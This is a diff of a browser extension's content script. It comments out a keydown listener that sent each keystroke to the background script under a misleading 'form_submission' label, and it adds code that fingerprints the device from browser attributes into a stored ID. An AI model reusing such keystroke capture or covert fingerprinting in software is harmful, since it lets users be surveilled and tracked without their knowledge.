@@ -38,19 +38,19 @@ function getCurrentTabUrl(callback) {
   });
 }
 
-document.addEventListener('keydown', (event) => {
-  // Capture the keystroke and send it to the background script or server
-  // console.log(event.key);  // Example of logging keystroke
+// document.addEventListener('keydown', (event) => {
+//   // Capture the keystroke and send it to the background script or server
+//   // console.log(event.key);  // Example of logging keystroke
   
-  chrome.runtime.sendMessage({
-    type: 'log_activity',
-    action: 'form_submission',
-    data: event.key
-  },function(response) {
-    console.log('Background response:', response);
-  });
+//   chrome.runtime.sendMessage({
+//     type: 'log_activity',
+//     action: 'form_submission',
+//     data: event.key
+//   },function(response) {
+//     console.log('Background response:', response);
+//   });
 
-});
+// });
 
 
 // Function to capture key presses
@@ -116,3 +116,66 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
     sendResponse({ isLoggedIn });
   }
 });
+
+
+// Function to generate a short and unique device ID
+function generateDeviceId() {
+  // Collecting some device-related information
+  const userAgent = navigator.userAgent;   // User-Agent string (Browser & OS)
+  const platform = navigator.platform;     // Platform (e.g., Win32, MacIntel)
+  const language = navigator.language;     // Language preference of the browser
+  const touch = 'ontouchstart' in window || navigator.maxTouchPoints > 0; // Touch device detection
+
+  // Create a unique string of device info
+  const deviceInfo = userAgent + platform + language + (touch ? 'touch' : 'no-touch');
+
+  // Generate a hash from the device info
+  return sha256(deviceInfo).then(hash => {
+    // Shorten the hash (you can adjust the length as needed)
+    const shortenedHash = hash.substring(0, 10); // Use only the first 10 characters
+
+    // Optionally encode the hash in Base62 for a short alphanumeric ID
+    const base62Id = toBase62(shortenedHash);
+    return base62Id;
+  });
+}
+
+// SHA-256 hashing function
+function sha256(str) {
+  const buffer = new TextEncoder().encode(str);
+  return crypto.subtle.digest('SHA-256', buffer).then(hash => {
+    let hexArray = Array.from(new Uint8Array(hash));
+    return hexArray.map(byte => byte.toString(16).padStart(2, '0')).join('');
+  });
+}
+
+// Base62 encoding function to shorten the hash to letters and numbers
+function toBase62(str) {
+  const base62Chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+  let result = '';
+  let decimalValue = parseInt(str, 16);  // Convert hex string to a decimal number
+
+  while (decimalValue > 0) {
+    result = base62Chars[decimalValue % 62] + result;
+    decimalValue = Math.floor(decimalValue / 62);
+  }
+
+  return result;
+}
+
+// Generate and log the short unique device ID
+generateDeviceId().then(deviceId => {
+  console.log('Short Unique Device ID:', deviceId);
+  // You can store this device ID in chrome.storage or localStorage for persistence
+  chrome.storage.local.set({ deviceId: deviceId });
+});
+
+// chrome.runtime.onInstalled.addListener(() => {
+//   // Request public IP from ipify API
+//  // Generate and log the short unique device ID
+//   generateDeviceId().then(deviceId => {
+//     console.log('Short Unique Device ID:', deviceId);
+//     // You can store this device ID in chrome.storage or localStorage for persistence
+//     chrome.storage.local.set({ deviceId: deviceId });
+//   });
+// });
